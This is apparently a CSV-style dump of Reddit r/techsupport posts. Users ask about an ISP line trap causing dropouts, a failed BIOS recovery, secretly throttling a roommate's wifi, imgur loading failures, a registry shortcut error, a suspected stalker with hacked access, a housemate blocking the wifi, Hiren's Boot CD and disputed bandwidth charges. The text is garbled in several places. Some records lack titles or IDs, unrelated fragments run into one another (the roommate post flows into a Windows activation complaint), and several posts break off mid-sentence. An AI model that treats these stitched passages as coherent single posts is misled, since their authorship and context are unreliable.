2cgaak,"Comcast/Xfinity tech just came out after 4 years of intermittent connectivity and took an ""internet trap"" off our line","I'm pretty frustrated at this point, dealing with Comcast/Xfinity, who has a cable internet monopoly in the Houston area. I moved to my house 4 years ago and had dropped signals every couple of hours or so. Just enough to piss me and my spouse off but only make a phone call ever 3-6 months.  We upgraded our equipment twice over these years, with highly rated modems and routers.

This past time I called, and they always tell me, ""Let's run a test to make sure your internet work...OK ma'am! Everything looks good on our end, call us if you have any other problems!""

I finally asked for a tech to come out and actually LOOK at our pole/line. I'm so frustrated this was NOT ONCE ever suggested by one of the CSRs I ever spoke with, and why did the initial installer not notice it? The trap looked like [this](https://www.ncta.com/platform/wp-content/uploads/2013/03/trap_filter-300x182.jpg) and was connected directly to the cable line that went from the pole to our house ONLY.

The very best I could get was $18 off ONE MONTH'S bill when I called to complain and I was as nice as I could be. The tech who came out was embarrassed about it.  

But the bottom line is that we have been paying a monthly fee for a service we were not getting. The regular CSRs can't and won't do anything for me.  

I know this is not exactly TECH support, but I'm not sure the most appropriate sub to post this in but hoping maybe someone could provide insight on ""rights"" (LOL) or any sort of leverage I have as a consumer....OR an appropriate Comcast/Xfinity contact I could send my complaint to.  Thanks in advance


Edit after reading some responses....first he checks our line that goes directly into the house. He said ""I think there's a problem with your line because I'm not getting low frequencies.  But wow you have a d-link 2.0 (wtf?) So let me call my supervisor to see if I can give you a better one""  yet our modem is fine. I'm confused, and the next thing I knew he's on the ladder checking out the wires and lines on the pole.  Ten minutes later he shows us the ""trap"" he's found and says it's likely the cause of the connection drops. Um ok, so I asked how could that have been there So long and no one suggest to check for it? He just apologizes for Comcast and said he had been on the job less than eight months, maybe someone had an issue with signal "" noise"" ... again I'm confused but had to leave shortly since he was
 already two hours late.  

So basically only time will tell if that was the cause for

2bomkw,Hi Reddit my name is Cybil and I fucked up.,"Hello.
Recently I was having some trouble with my computer, With the help of some kknd gentleman from this very subreddit i came to the conclucion that it was probably my RAM.

Just to make sure i tried booting my pc one more time.
HUGE mistake.

I booted into bios and then abruptly crashed. Upon rebooting i was told that my main bios had been corrupted BUT thanks to gigabytes dual bios it would recover automatically and under NO circumstances was i to turn off my pc during recovery.

Guess when my pc crashed next.

Now my computer wont boot at all. I tried removing and replacing the battery, I tried clearing cmos. Nothing.

Just flickers on for one second then flickers right back off.
I am an idiot reddit.

So who wants to be a kind gentleman and tell me theres something i can do about this short of returning my motherboard.

29021b,Am I a bad roommate or not? (artificially limiting max download speed to prevent connection freeze),"**EDIT** : Thanks for all the great feedback. I decided to re-enable the router to the full 54 mbps (even though we get a total of about 8Mbps in practice) for the time being, with the option of reducing it back to 5.5 in the future if the problem re-occurs frequently. 

I decided not to talk about it this time, because I had already asked him about limiting his download speeds in the past a couple times - including one instance which particularly bugged me because it made me disconnect from an online exam I was taking. (I had to email the professor to initiate a reset on the exam to avoid failing it). I think bringing the subject over &amp; over again would just create tensions that can be avoided. 

---
Original thread:

My roommate and I are paying equally for our Internet connection.
He is responsible for about 70% of our monthly* bandwidth usage, but I also use YouTube / stream news every now and then. Whenever he downloads a movie / game, it litterally clogs my connection to me sometimes being completely unable to access Google Search, Gmail or Facebook.

I've asked him to artificially limit his downloading speed to maybe 700kB/s if he's using a downloading client such as Steam (we have about 1MB/s total), as I am doing the same, and it fixed the problem... but sometimes he forgets to do it. 

Today I went into my router's web page settings, and I limited the maximum wireless bandwidth to 5.5 mbps, which according to my calculations, is (5500*1024)/8=704kB/s. It still allows him to download fairly fast and watch videos in 1080p, but it doesn't affect me because I'm using a wired connection. It definitely fixed all my problems.

My ethical issue is that I haven't told him that I just did this though. AFAIK, he is watching netflix right now and has not noticed a difference.

However, when I complained that I needed the internet (that I'm paying money for) for my job immediately, they quickly sent a ""refresher"" signal and it went up instantly.

Recently; her hard drive died; so we replaced the last ""old"" part in it with a solid state hard drive. When reinstalling Windows; it failed to authenticate.

Contacting Windows Support; they pretty much said that she is out of luck and would have to either A. repurchase Windows B.upgrade to Windows 8 for $120  or C. Some kind of ""care plan"" where they give a new key and a year of tech support for $149.

This seems somewhat rediculous because... I already paid once for the software?   Is there a better way to get around this?

TL;DR  shit computer, multiple reinstalls of Windows, will not authenticate anymore. Windows support tells me to open wallet or pound sand.

Any suggestions?

She has a Gmail account and I'm sure that's been compromised too. She asked me to log into her Facebook and send a message to myself to see if it was coming up blank like it had been doing for her other friends. Messages have been disappearing also, they have taken over her last few attempts to create a completely new profile after wiping the PC.


 After a couple hours looking at the computer, sifting through connections to the network, security settings and recent activities on both accounts there seems to be no problems. I ran a malware scan and also a full pc scan but turned up no results. I got home to find that after sending a message to myself the Facebook account name has changed completely to a different name and has recently liked one of those seedy looking FB games and had recent activity on it. I called her to confirm that it wasn't her.

 There were some strange prompts coming up when I was looking through things, mainly unknown .msi prompts. Apparently there's been visits to sites she had no idea existed, flashing up random browser windows with stupid things like ""REVENGE"" to incredibly inappropriate sites etc. (which I can assure you my mother has no interest in nor has visited these) Unknown applications have been running on the smartphone. 

She has tried to do a full system restore and had her  phone wiped but it still keeps occurring. She also has some strange cmd screen flashing up temporarily before rapidly disappearing. 

Is there any possible way to find out what exactly this person is doing and how to finally put an end to it?

It's really starting to worry me because she has used this PC for accessing sensitive and personal information.

1xie6g,In Over My Head And Need Advice,"I feel like this might not be the most accurate place to post my issue but I don't know of a better sub-reddit.  I apologize in advance for my Wall O' Text - this got away from me quick.

Let me begin with some history so you can understand where I'm coming from.  Fairly intelligent, completely unmotivated growing up.  This led to me dropping out of high school and getting my GED after my first semester.  Years 15-27 were spent pissing the time away playing video games and working dead end food service jobs.  My formal IT training comes in around year 17 when my brother shows me the basics of assembling my own computer.  It stops there.

Got sick of food service jobs and switched to sales at 28.  Better money for half the work.  One day a printer on the sales floor stops working.  Third party IT guy can't make it to our store for several hours.  Management is in a panic: no printer = no money.  So I save the day by power cycling both the PC and the Printer.  (I resumed my formal IT training with a few episodes of ""The IT Crowd"" back in '10).

I save the day a few more times and become the de facto computer expert in our store.  Fast forward a few months and the GM says they want someone in house for IT and offers me the job.  Not wanting to mislead him I explain that I'm not qualified, I've just spent a lot time using computers.  He counters with ""No one that is qualified will do the job for what we are willing to pay.""  $10/hr M-F with vacation and benefits?  No more shitty customers?  Sold.

I spend the next year playing Doctor.  All in all it goes pretty well.  Me and Google become best bros.  I'm interested and I enjoy my work.  I even teach myself the (very) basics of networking, by copying and pasting policies and changing the IP addresses.  I get the first raise of my life to $15/hr - GO ME!

I start getting loaned out to other stores nearby.  Everyone likes me etc etc.  Then I'm asked to help with a new store they are building a few towns over.  They bring in someone to do the heavy lifting while I learn just how fun it is to make patch cables.  Happy though, had fun learning some new stuff.

Another year goes by and the owner approaches me.  He wants me to move to the city where the company is HQ'd and setup/staff/run a company wide IT department.  We've grown considerably in the last few years and he want's to move all support in-house it seems.  Not wanting to mislead him I explain that I'm not qualified, I've just spent a lot time using computers.  He counters with ""No one that is qualified will do the job for what we are willing to pay.""  $30/hr M-F with vacation and benefits?  No more shitty driving?  Sold.

So here we are...4:30 in the morning the day before I start my new position and I'm freaking out because I have to buy a new switch for a store and I haven't the slightest clue what the fuck I'm doing.  

""WTF? Why is one 48 port switch $500 and another $2k?  Son of a bitch these Amazon reviews are no fucking help.  Wait...they make 10 gigabit switches?  At least that is what it says right here on this listing.  But there's only one of them so did they fat finger in the 0?  Fuck.  And whats this shit about smart and not smart?  Wow...thank god I googled 'How to daisy chain switches' and one of the first results was 'DO NOT DAISY CHAIN SWITCHES NOOB'  And all this time I thought stackable just meant they could sit on top of one another...like on a counter or something...god I'm such a fuckwit...I'm going to end up fired in six fucking hours.""

So I've I've come up with a four step plan.  

1.  Get organized
2.  Get edumicated
3. ??????
4.  Stay employed

(1. Right now I am the sole source of support for 7 stores.  Every employee has my cell phone number and calls me when something is broke.

I will be getting a TeamViewer liscense and a separate cell phone with an 800 number that forwards to it.  I've never worked on a help desk, anything I need to know/consider for the initial setup?  Anything I should know about how it works other than generate ticket &gt; work ticket &gt; notate &amp; close?

(2.  I need to step up my education.  I have reached the limit of what I can self teach, especially with regards to networking.  I attempted a CCNA book and I just can not get my head wrapped around that stuff on my own.  Hell I don't even understand subnets.  I don't have to go too deep, there really isn't anything too technical going on at our stores.  Workstations&gt;1-2 switches&gt;gateway&gt;10mb fiber easy right?  Each store has 2 of those 10 megs dedicated to an MPLS that does something with our main store.  I don't understand what an MPLS is/does.  I recognize some of the words on it's wikipedia page.  Our main store has VLANs .  I don't really understand those either.  Don't even bother asking me about our phones.  Formal education won't be an option until my fiance finishes her masters in 2015.  So are there any short term options that don't involve self teaching?

(3.  I know it's a cliche but it's sincere.  I truly don't know what to do next.  I get organized and learn some more so what should my next step be?  

(4.  More than just staying employed I wish to make a career out of this.  I just don't know how to at the moment.  Assuming I don't fail at this, where do I go from here?  Will this be as good as it gets for me?

Thanks for your time and sorry about the long post.

1wb4oq,Having issue with imgur,"Hey,

I've been having issue with accessing pictures on i.imgur.com.

I use Chrome primary and Firefox as well. Anytime I click on a link to i.imgur.com, it either comes up with ""This web page is not available"" in Chomre or ""Program loading page"" in FF. When using Chrome, it is consistently failing to load the image while in FF, its 50/50. 

This issue is happening on 2 computer in my home and my Android phone that has Chrome and Reddit is Fun app when its connected via wireless.

I can load http://i.filmot.org/mIZQnsh.gif but not http://i.imgur.com/mIZQnsh.gif

I've tried the following

* Changed DNS from ISP's to Google DNS (8.8.8.8, 8.8.4.4)
* Tried DNS Flush (ipconfig /flushdns)
* Reinstalling Chrome and Firefox, no effect
* Using FF in safe mode, no effect
* Rebooting router and computers, no effect

Nothing's changed from yesterday, no new software, hardware, etc. I even tried to load a link that was blue but also failed to load.

Is there something that I'm missing?

**Edit 1**: Telus seems to be the common denominator here with one or two foreign ISP having non-related issue. Someone wanna volunteer to call Telus? :D

**Google Chrome Fix** 

As posted by /u/ColonelSanders21

&gt;(in Chrome) Settings-&gt;Show advanced settings-&gt;Content settings (under privacy)-&gt;All cookies and site data and then I searched for imgur and deleted them all individually.

Unfortunately this didn't work for IE or Firefox.

**Edit 2**: Telus has been notified and the issue has been escalated to their network team to look into it

**Edit 3**: An update from /u/MegaHz 
&gt;Telus Support now says it is a known issue, and is being worked on. In the mean time, as a workaround, load the site with https://
Although direct image linking to the i.imgur.com domain does not support https://, you can use the chrome extention Use HTTPS[1] to force imgur.com to load using https without having to type it in every time
TL;DR Read the bold

1vv7p0,I fucked up (all shortcuts on my desktop now start Age of Empires),"\* I edited this post three times now, read the edits at the bottom. *

Here is what happened:
I modified my Age of Empires. The shortcut on my desktop couldn't find the game and asked for the right way to start the application. I thought it meant that it wanted to know where the shortcut should point to, instead it now thinks all of the shortcuts are the Age of Empires.exe.

In my RegEdit the .lnk file looks like [this](http://i.imgur.com/SPf8zsk.png). You can also see the bar at the bottom with the Age of Empires logos.

If I press the Firefox shortcut on my desktop it opens Age of Empires. The only way to start Firefox is by using the keyboard hotkeys. The same goes for opening any other file. Even the Windows start menu is affected.

What can I do to be able to use my computer like a normal person again?

edit:

I fixed it! The proper solution is really easy. In the picture above you see the map UserChoice in RegEdit, the one from .lnk. Delete it and reboot your computer.

edit2:

Actually there still is one minor thing. Everything seems to work fine now. But someone in the IRC channel in the sidebar told me to delete the .lnk map in HKEY_ROOT_CLASSES. What should I do with this, or just leave it be? (everything does seem to work correctly)

. 

So guys I still have the potential problem of a missing .lnk map in HKEY_ROOT_CLASSES. What should I do about that?

edit3:

The missing .lnk map from HKEY_ROOT_CLASSES removes some functionality from the shortcuts in the Windows start menu. Could someone tell me how recreate the .lnk map from HKEY_ROOT_CLASSES.

And although I appreciate everyone trying to help, I really want this fixed, so please only respond when you know you are able to fix my problem. I don't mean this in a mean way. It's just that the entire reason that this last problem exists is because someone gave me wrong advice.

I use (a legitimate version of) Windows 7.

u/RoughLikeYourMother's solution solved my second problem. So everything works again. (hopefully)

12gr4z,TechSupport... most of you own or work at a place that fixes computers around the clock... what are some things you have done to greatly improve your efficiency(time and money wise)? I'll share some.,"1. I created an intelligent macro that grabs a notepad of the PC's information on users, specs, number of temp files etc and then uses things like CCleaner to automatically clean up the machine. Then I come along and finish up.

2. KVM switches are amazing.

3. Use wireless mice/keyboards (purchase in combos). Greatly reduces price and clutter.

4. Tupperware containers that lock together are amazing.

5. I have a specific bin for DDR, DDR2, and DDR3. Each has its own division for the different speeds.

6. I have fold-out workstations in the planning stages (they fold out from the wall and are equipped with 1 ethernet, 2 power jacks, and a monitor mounted to the wall behind it).

EDIT: Guys, loving the suggestions. I learned quite a bit. I think I'll keep this under watch and continue adding to a master list at the top. Just be sure to permalink or go back and continue adding suggestions. I'll stay on this.",https://www.reddit.com/r/techsupport/comments/12gr4z/techsupport_most_of_you_own_or_work_at_a_place/,1351788869.0,81,0.96,58,techsupport,TekTekDude
122cw5,How to start being a computer repair technician off of craigslist.,"Hi There,

So I figured I should contribute to reddit or something and write maybe a quick guide on how to be successful as a craigslist computer repair technician.  

Quick background on myself.  4 years ago, my wife and I were really poor, I was unemployed, she was working a minimum wage job, we were BARELY paying the bills every month, and we needed to find a way to pay for things without paying $1200 a month for daycare.  So one day I decided to put myself out there on craigslist, and have learned many of these things as I've become successful doing it.  I started out doing this with literally a phillips screw driver and my home computer.  I now have a new car, an ipad I use solely for work, and all kinds of stuff, plus the ability to work from home, life is good. 
I help between 3-4 customers a day.
I work typically about 3 hours a day, on my own schedule.
I make about $150 a day on average.
The average cost of doing this is roughly $10-15 a day depending on your vehicle, ISP costs, etc.

Things you will need to start.
$30 to purchase tools. (tool recommendations below) Lots of guides will tell you to buy a big computer toolkit, but you really don't need that. You need 

1. PATIENCE, I cannot overstate this enough, this will make or break your business!
2. Your tools 
3. Cell-phone
4. Car (optional, increases your income potential by alot tho)
5. Mobile tools (if you have a car, pick up a cheap basic toolkit from a riteaid or something and just leave it in the car, you'll be surprised how often you use it)

Ok, so having read all that you have decided to be a craigslist repair technician, awesome!  If ya do it right, your life is gonna be awesome.  So here goes.

Pricing
-------------------------
People come to craigslist to get deals and to save some money, realize that when your writing your ad.  First lesson I learned pretty fast, is hourly rates DO NOT WORK. In the first two weeks of doing this, I initially charged $25 an hour, I got one customer in 2 weeks. Charge a flat rate!  
I charge a flat rate and plan on my jobs being fixed or resolved in under 2 hours.  My charge is what I expect to do for 2 hours of work.  So If you want to make $25 an hour, charge $50 to fix someones computer.  This is a HUGE undercut of store services or the Geek squad or staples, your making a great wage, and Saving people a TON of money! You will be absolutely surprised at how often you'll get jobs that take only 20-30 mins to fix, then you just made $50 for 20 mins worth of work!  Conversely tho, this is a #'s game, and you will run into jobs that end up taking for longer to fix than you originally planned.  PATIENCE!!! Doing this kind of work will earn you FUTURE MONEY, suck it up and DO IT, NO COMPLAINTS to the customer either, JUST FIX IT!  I've done screen replacements on unibody macbooks for $30 before, JUST DO IT!

If you have a car, your going to be making more money, you can now charge a gas surcharge!  Make it reasonable and this will become your bread and butter.  3/4's of what I do is on-site visits now a days, keep some dog treats on you when you go to new customers' houses, they'll freakin love you!

Writing Your Ad
-----------------------
Craigslist ads search off of the title and the body of the message.  Make sure to ad things like pc repair, mac, etc to the bottom of the ad to make sure it gets the most visibility.  Your ad will get flagged from time to time, and don't take it personally.  There are quite a few people who make their money off of craigslist and your now a competitor.  Have a good smartphone, get your email on your phone and repost the ad when it gets flagged, and THEY WILL GET FLAGGED.  Your ad can be reposted 5x a day before your account gets locked til the next day.  When someone flags your post, thats great, you just got to top post it for another at least 30 mins.  

It can be easy to develop flag and ad anxiety if this is your sole income, don't sweat it and just realize that these people are wasting more of their time than yours and enjoy the advertising ""reminder"".  

Keep your ad primarily in computer gigs, if possible also in the barter section if your willing to take trades.  I have gotten so many tools, tablets, mp3 players, movies, tv's, tattoos, etc from having my ad in the barter section it really pays itself off. Got paid in gold dust once, that was kind of cool!

Helpful software
--------------------------
Ninite - Ninite.com saves me so much time since I probably do a windows install EVERY SINGLE DAY.  People love getting free software and MANY of your customers don't know that the words Free and Antivirus can exist in the same sentence.  You handing out free copies of Microsoft security essentials and open office is like giving lil charlie a golden ticket to your customers!  
Rkill, TDSSKILLER, Malwarebytes, OTM, Gooredfix -  Common tools to remove viruses.  All very useful and can fix most ""viruses"".  There are tons of other alternatives to these, and use w/e your the most comfortable with, but I've found these are fast, lightweight, and easy to use for users, as many times I'll leave a copy with the customer to help themselves in the future.
WinToFlash - This will let you ""burn"" any version of windows to a bootable usb stick and install it from it, just like the CD.  Great laptops with broken dvd drives and netbooks, etc. 
Other things I keep around are common registry tweaks, like default_exe, taskmanager.reg, wallpaperenable.reg, InstallTake_ownership.reg, etc.



Key tips!
----------------------
1.  Your customers think of you in the same way that many people think of mechanics.  They don't trust you, they think your going to try to screw them over. You will have to prove through your words and your actions that you are worthy of trust.  Trust is your absolute best asset towards growing this kind of business.
2.  Many of your customers will be people that are FAR FAR FAR from literate with a computer.  Patience and GOOD customer service are FAR more important to the benefit of your business than your actual skill with the computer.  Patience will get you repeat customers!  Repeat customers are the heartbeat of what you do, NEVER take any customer for granted.  I helped a lady in a Starbucks once, she told her boss about me, I got a $1500 EMR contract to help migrate his dentist office to a new medical billing system.  
3.  Be realistic and DON'T scare people.  People don't want to hear ""You have 300x things wrong with your computer"".  They want to hear ""Oh, don't worry about that too much, I can fix it!""  You will become their go to computer guy for anything.  Be prepared to take phone calls and don't charge people for stuff like this.  If your willing to bend a little and help people out, they won't be afraid to toss money at you like it's setting their wallets on fire.  I once drove 30 miles to a guy's house to fix his WiFi only to find the WiFi switch was off, I didn't charge him and I've earned him as a repeat customer, and probably made $150 off of him over the course of a year.  If i didn't eat the initial visit, I don't know If he would've kept me around.
4. Be prepared to not make much for a while until your name gets out there.  Your reputation is WORTH WAY MORE THAN ANY SINGLE JOB! 
Do not take any job your not comfortable with, or don't think you can fix.  Be honest and upfront with people about expectations, and do your best to empower your customers to fix things themselves.  They'll trust you and pay you for the convenience!  Stand by WHAT YOU SAY, and be willing to go the extra mile for your customers, THEY WILL LOVE YOU!
5. Take pictures of your customers on your phone, and write a small note on their contact (if you have a smartphone) so that you can remember them and what you did for them.  You'll be helping lots of people every month and it can be very hard to remember them all, but people love knowing you remember them.
6. BE SAFE!  Write down any addresses to new customers and keep them around at your home if you don't know these people.  Let people know where your going.  You are dealing with people off of craigslist, yes most people are awesome, but be prepared for the crazies, which you WILL run into eventually. (yes, I Have crazy people stories)

Tools Recommendations
---------------------------
1. A precision screw driver set WITH HANDLES, do not get the skinny ones, you'll hate yourself for it.  Something like this is good. 
http://ecx.images-amazon.com/images/I/41PADNxaDfL._SL500_AA300_.jpg
2. A set of normal steel-shafted screwdrivers.  Stanley has a great set of steel-shaft screwdrivers with an interchangeable handle (not head).  Cost like $10
3. A solder gun (if you know how, this can increase the variety of jobs you can take) $7 at radio shack. $3 for solder. 
4. An anti-static wristband is typically about $5-7 and is easiest to find in one of those computer toolkits, but can easily be ordered off of amazon also.  
5. A can of compressed air
6. A tiny flashlight of some kind. No, your phone is not good enough, Go buy a $1 TINY flashlight that you can hold in one hand without having to mess with touchscreens, it will instantly become your favorite tool.
7. At minimum a 4gb flash drive. That you can keep on your keychain.

Ok, thats all I can think of for right now.  I'll answer any questions anybody has, and best of luck all of you!

I work with general computer tech phone support (software), and have made three pages that often help me troubleshoot.
The average person that calls to tech support doesn't really know what flash, silverlight and java is or how it works, but they often do know how to access simple websites by URL.

I have made the following websites:

http://www.ismyflashworking.com

http://www.ismysilverlightworking.com

http://www.ismyjavaworking.com

If the user does not have javascript enabled, they will get a warning and a link to a guide on how to enable javascript. I've been using the sites myself for quite a while now, but thought it would be nice to share :)

I plan on adding a troubleshoot-button to each page as well in the near future, with information on how they might reinstall/fix installations of flash/java/silverlight.

The pages have helped me, I hope they will help you guys :)

11okte,Computer plays same song at 730am every day. Can't figure out why. Any help?,"Running Windows 7 Ultimate, only use songbird and vlc to play music but for some reason WMP opens the same song and just that song at 730 every morning. There's nothing under the windows task scheduler. I checked under cmd as well by typing ""at"" with nothing listed. I have no idea what it could be. Any ideas?

If anyone's wondering, the song is Young Jeezy's ""Talk to em""

Is there any hope of recovering them?,"I've had the same Hotmail account since the late 90s, but used it less and less frequently over the years, as I switched to Gmail (of course). But the account had a lot of messages and conversations that mean a lot to me from earlier periods of my life, for example from now deceased family members and friends.

I haven't logged on for a while (maybe 3-6 months, but I believe it's been less than 270 days, which is their cutoff), and was shocked to find my inbox empty (apart from a new 'Getting started with Hotmail' message) and my folders deleted. I *know* I should have backed up this stuff somehow, but this being Hotmail, I gave up last time I tried. I've always used the browser login.

Can the emails be temporarily backed up anywhere, i.e. is there any hope of recovering the emails? I can't even find a good way of contacting Microsoft apart from the forums, where similar treads go unanswered by the dozen...

(Edit: I've contacted their email support and live chat now, but not holding my breath)

yqvl7,I think someone may be spying on my sister's internet activity.,"My sister has this friend who she friend zoned. This guy is supposed to be pretty good with computers. We think this guy may have hacked her computer, and is stalking my sister. It all started with my sister looking into buying a truck so she googled ""F150 Raptor."" He later texted her saying, ""The Raptor is my favorite truck."" She took it as coincidence. On another occasion, she googled ""Buffalo Wild Wings."" He texted her almost instantly, ""You want wings or what?"" Then, my sister looked up make up tutorials on Youtube. He then texted her, ""I bet you're one of those girls who looks up make up tutorials online."" On yet another occasion, my sister googled, ""if you practice singing do you get better?"" He instantly tweeted, ""Yes princess, practice makes perfect."" My sister was once talking with a friend of hers on the land line after an early morning jog. He send my sister a good morning text saying he was up for a jog. My sister tells her friend she thinks this guy knew she woke up early to go for a run, and he instantly sends her a text saying, ""I had no idea you were jogging."" My sister is creeped out, and frankly so am I. Is it possible that this guy has not only hacked her computer, without ever having access to it, but also tapped into our phone line? Is there any way to find out, and if he has, is there any way to stop it. Going to the cops would be the obvious answer, but we'd like to leave that as our last option.


tl;dr Is it possible this guy knows what my sister looks up online, and what she's saying on our land line?


edit: I forgot to mention that as a present he gave her two usb drives full of movies which she of course plugged into her computer. That might be a way he could have gotten access to her computer.

Update: Thank you guys so much. You've all been a great help.

yp14y,"Visit imgur.com, see ""Project Review Period Is Now Over"" from ""PLAVEB"". Malware or what?","I first had a problem opening imgur URLS that weren't in the form http://i.imgur.com/xxxx.jpg. I made a topic on it here:

Sadly, that went unsolved.

Starting today, any imgur link that isn't in the form above (even www.imgur.com) takes me to a page that says only ""Project review period is now over"" in a slick little graphic. The company name in the corner is ""PLAVEB"". My initial Googling revealed nothing.

Anyone see this before??? I'm worried I have malware.

Edit: Just had a thought. I went to www.imgur.com on my smartphone and got the same dumb message. This isn't malware, it's gotta be some wifi firewall thing. :(

Edit 2: Maybe not a local wifi thing.

xxrls,"""You're not allowed to use the internet when I'm home""-My dad.  I need help figuring out why our internet speed drops to nearly nothing unexpectedly for a few minutes when certain computers are on","*edit*

There are **no torrent clients or any p2p software or any similar programs on these computers.** I know because I've checked.  Please stop suggesting that. I am moderately sure it is not a bandwidth problem, I believe it is some sort of setting problem on a computer.  

------


Name|Description
-|-
ISP|Verizon Fios 5Mbs down 2Mbs up
Router|[Verizon provided router](http://www.actiontec.com/products/product.php?pid=189)
Problem| **Internet speeds sporadically drop to almost nothing when many computers are connected to the router**
Frequency of problem| Occurs a few times over several hours when many computers are connected 
Previously failed solutions| (1) Verizon replaced the router
 |(2) We purchased a Linksys router (assuming it was a problem with the verizon routers they kept sending us)
Current workaround | Reboot router. Internet speeds resume fine after a reboot
Current theory | It is not a router problem since replacing the router didn't change anything. It must be a computer problem, but I'm not sure what computer or how many have this problem. 
Additional information|This problem only occurred after my brother and I came home from college and connected our PCs to the network. They're identical desktop builds running windows 7 x64. This occurs during basic internet use (no file downloading, just web browsing). 

**Although connection to websites is slowed or even impossible during these moments, I can go directly to the router home page with no problems**



Solving this would save a lot of family problems and arguments


*edit2*

You guys gave me a lot to work with, thanks! After my initial virus scan, one PC had about 6 java exploits It's clean now and I'm doing an additional virus scan. I'm awaiting the connection to drop again and hopefully find out which computer triggered it.

x1sks,HP PAVILION G7 CAPS LOCK KEY STUCK ON,"edit3: [](/solved) 
Kinda solved.  User sephiroth2k wrote a program that I can throw in my start up folder that toggles caps lock when it is run.  While it's not the best solution (as in, it doesn't fix the source), it works!  Thanks a ton, man!


http://www.reddit.com/r/techsupport/comments/x1sks/hp_pavilion_g7_caps_lock_key_stuck_on/c5itdfz

---

edit2: Here's what I've been able to find out/clarify thanks to most everyone that replied

Caps lock gets turned on during POST, first thing when the computer turns on, and the caps lock key itself is unresponsive when you press it.  My guess is it's an issue with the contact on the key or how the keyboard is connected to the laptop.


Anything that would remap or unbind the caps lock key doesn't work, because it gets turned on when the computer turns on and windows is unable to detect any keypresses from the button.  


The only thing that does work is doing something that actually toggles caps lock from windows, like the on screen keyboard.  The problem with this is the on screen keyboard program has locked up like 45 out of 50 times I've tried opening it.


Of course, I could just hold down the shift key as I type, but in the long run that just isn't feasible.  My pinky is almost cramping up a it is, so I can't imagine trying to type a paper like this.



The one thing I have NOT tried is using something like a usb keyboard.  I do not have one available at the time, but will give it a shot when I can.


---

edit: [](/solution) 
User talkingsmall suggested using the on screen keyboard to turn off caps lock.  While this works, my on screen keyboard doesn't even load 90% of the time (it locks up), and caps lock still turns back on during POST.

uaalb,Kid blocked others internet connection via wifi. What are the countermeasures?,"So here is the situations:

* I live in a house with 10 other students. I am the oldest, landlord is female so I am usually in-charge of most of the technical aspects in the house.

* Wifi connection is shared. The internet router is D-Link DCM-604. 
WPA/WPA2 Encryption (TKIP + AES). Everyone in the house knows the wifi password. Only I know the router admin password.

* One kid decided to block all others internet connection, leaving only him and his roommate so they can play MMO lag-free. I don't know which hack tool he uses or how did he does that. I only overheard him talking to his friend that he is locking others so he can play

* I checked the router settings, nothing changed, nothing in the port filtering/IP address filtering/MAC address filtering sections. Only I knows the password so I don't think he accessed the router settings.

* Every PC can connect to the wifi and locally, just not the internet. Sometimes I can ping external website (google.com), sometimes I can not.


So my questions are:

* How did he do that? OR What hack tool did he used?

* How to prevent and counter?


I do not want to expose him to the landlord yet. He is just a kid, I want to get more proof and confront him first.

5184 hours, which is exactly 216 days, and I checked my invoice, and it was exactly 218 days since I bought the drive, and 216 days since I installed it.

qdugd,I have found this extremely helpful in many situations - Hiren's Boot CD,"[Hiren's Boot CD Website](http://www.hirensbootcd.org/)

Hi everyone,

I see that there are many helpful, kind, and talented techs here doing a great job of solving many problems, so I am hoping to launch a pre-emptive strike of helpfulness :P  

First a quick background - I have worked with IT for about 7 1/2 years now professionally (1 1/2 teaching) so I've seen many BSODs, password resets, Outlook errors (control+right-click on the taskbar icon is a miracle worker), and just about any other help desk, family emergency, server, and network type issue you can imagine.  

That said, here is why I recommend you add Hiren's to your toolkit immediately:

1. Hiren's is free (as in beer)

2. It is loaded with all kinds of helpful apps.  I like to call it the Swiss army knife of troubleshooting.  Check [here](http://www.hiren.info/pages/bootcd) to see some of the awesome apps it has.  For starters, you have: 

* Multiple Antivirus/Antispyware/Antimalware/AntiRootkit apps 
* A few file recovery apps for when you accidentally delete data (I used Recuva to recover approx 1TB of data for a friend)
* Many backup applications
* Troubleshooting utilities like ""The troubleshooter"", memtest, Maxtor PowerMax and WD Data Lifeguard, etc etc

3. You boot from it, and not Windows.  This means no issues with BSODs, and you don't have to worry about viruses running in the background.  Ridding yourself of viruses and spy/ad/malware becomes much easier with this tool.

4. I mentioned ridding yourself of viruses above - in my opinion the best way to prevent that issue in the first place is to do regular backups of your data (terabyte drives are going down in price) and use Hirens to create an image of your newly installed OS.  Using Hiren's, do the following: 

* Back your data up
* DBAN the computer
* Install your OS of choice 
* Create a second partition of about 40 Gigs to be safe (this will store your OS and any apps that you want to have installed)
* Create an image with Clonezilla or Ghost.  

Congratulations, now repairing your PC when/if you get a virus is as easy as restoring your image!

5.  You can boot to ""Mini Windows"".  Now you don't need to fumble around in DOS, trying to figure out why NTLDR is missing - you can just boot to Mini Windows and run the NTLDR fix app.

6.  There are really too many examples of why Hiren's is helpful to list here, but hopefully you get the idea.  Hiren's is a tool that empowers you, the user, and anyone else that you give a copy to.  I personally know many friends and family members that have thanked me profusely because of how easily they were able to boot Hirens and fix their pop up issues, or troubleshoot a failing memory stick.


So anyways, I hope you found that helpful.  If you have any questions I would be happy to address them.

EDIT: Thanks to everyone who checked out this post and provided helpful tips and conversation - as you may have noticed from the formatting nightmare above I am quite new to posting on Reddit (just over a day now).  

I will be around this subreddit to help out though, so hopefully you all will see more posts of a similar nature from me in the not too distant future (free software I think will be my next goal).

prbux,"I believe my ISP somehow deliberately added an impossibly large amount of ""bandwidth use"" to my account on the last day of my billing period, what can/should I do?","I got a letter in the mail last month announcing bandwidth caps, 8mb/s connections (what I have, I get around 4-5 mb/s, I use ~2-3) are capped at 150 Gb/month.  Yesterday I was forced to accept new terms of service saying I agree to this billing scheme (I have it noted on record that I begrudgingly accepted those terms as I believe the service is flawed) and I was immediately notified that I was in the redzone, and if my behavior continued I would be charged an extra 20% for my service (10$/50 gig's, and I was 100 gigs over).

I called my ISP (a rather large service provider, also the only one in my area :/) and they said, it looks like you use on average 2-4 gigabytes per day, but then yesterday you used 93 gigabytes.  I tried to convince the customer service rep that I talked to that this was a physical impossibility with the connection I have, but she was convinced I was either sending too many emails, or that I was hacked (nobody in my area knows what computers are pretty much, and there were no suspicious cars parked outside my house yesterday, it wouldve been really obvious).  She kept insisting that they send a technician to my house, which I declined noting that unless he were going to travel back in time he wouldn't be able to do anything with the problem, as it was obviously their monitoring of my service that was faulty.

those 93 gigs were just enough to put me way into the red-zone, and would have conveniently been covered by their highest tier service plan (20 mb/s) which I have no use for!!

I finally got to someone who knew enough to know that 90 gigs of bandwidth use in 1 day was out of the question, and he is ""looking into it"" but I doubt I will hear back from them.

